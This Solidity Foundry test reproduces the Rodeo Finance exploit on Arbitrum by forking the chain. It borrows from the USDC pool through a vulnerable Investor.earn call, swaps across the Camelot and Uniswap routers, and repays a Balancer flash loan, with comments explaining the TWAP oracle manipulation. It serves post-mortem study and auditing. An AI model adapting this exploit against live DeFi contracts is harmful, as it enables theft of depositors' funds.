// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~472 Ether (~$888K)
// Attacker : https://arbiscan.io/address/0x2f3788f2396127061c46fc07bd0fcb91faace328
// Attack Contract : https://arbiscan.io/address/0xe9544ee39821f72c4fc87a5588522230e340aa54
// Vulnerable Contract : https://arbiscan.io/address/0xf3721d8a2c051643e06bf2646762522fa66100da
// Attack Tx : https://arbiscan.io/tx/0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1678765773396008967
// https://twitter.com/peckshield/status/1678700465587130368
// https://medium.com/@Rodeo_Finance/rodeo-post-mortem-overview-f35635c14101

interface IInvestor {
    function earn(
        address usr,
        address pol,
        uint256 str,
        uint256 amt,
        uint256 bor,
        bytes memory dat
    ) external returns (uint256);
}

interface ICamelotRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        address referrer,
        uint256 deadline
    ) external;
}

interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

contract RodeoTest is Test {
    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 110_043_452);
        cheats.label(address(unshETH), "unsETH");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(Investor), "Investor");
        cheats.label(address(Router), "Router");
        cheats.label(address(SwapRouter), "SwapRouter");
        cheats.label(address(Vault), "Vault");
    }

    // Root Cause
    // The attacker was able to manipulate the Camelot V2 TWAP Oracle (attacking the unreleased ETH-unshETH pool)
    // TWAP price was calculated by averaging the last 4 instances of updated price where each price updating occurs every 45 minutes
    // TWAP price was manipulated via multiblock “sandwich” attack
    // Rodeo Farms utilized the faulty price oracle for LP pricing
    // Ultimately, the attacker bypassed the Health Factor check via Price Oracle manipulation,
    // opened positions using borrowed funds from the USDC Pool and triggered large-scale swaps in the Camelot Pair.
    // They then capitalized on the price difference by conducting equal-sized swaps in the opposite direction, thus profiting from the arbitrage opportunity

    function testExploit() public {
        // Begin with the specific amount of unsETH (info about amount taken from the above attack tx)
        // the attackers manipulated the price of TWAP Oracle through multiple transactions
        // such as https://arbiscan.io/tx/0x5f16637460021994d40430dadc020fffdb96937cfaf2b8cb6cbc03c91980ac7c
        // https://arbiscan.io/tx/0x9a462209e573962f2654cac9bfe1277abe443cf5d1322ffd645925281fe65a2e
        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
        unshETH.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(SwapRouter), type(uint256).max);

        // Vulnerable function
        // Vulnerability can be forced to swap USDC -> WETH -> unshETH

        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));
        // Swaps on CamelotRouter
        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));
        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));
        // Swap USDC to WETH on SwapRouter (UniswapV3 router)
        swapUSDCToWETH();
        takeWETHFlashloanOnBalancer();

        emit log_named_decimal_uint(
            "Attacker balance of unshETH after exploit", unshETH.balanceOf(address(this)), unshETH.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker balance of WETH after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // Swap flashloaned WETH amount to USDC
        swapTokens(amounts[0], address(WETH), address(USDC));
        // Swap all of the USDC tokens to WETH
        swapUSDCToWETH();
        // Repay flashloan
        WETH.transfer(address(Vault), amounts[0]);
    }

    function swapTokens(uint256 amountIn, address fromToken, address toToken) internal {
        address[] memory path = new address[](2);
        path[0] = fromToken;
        path[1] = toToken;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), address(0), block.timestamp + 100
        );
    }

    function swapUSDCToWETH() internal {
        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));
        ISwapRouter.ExactInputParams memory params =
            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);
        SwapRouter.exactInput(params);
    }

    function takeWETHFlashloanOnBalancer() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30e18;
        Vault.flashLoan(address(this), tokens, amounts, bytes(""));
    }
}
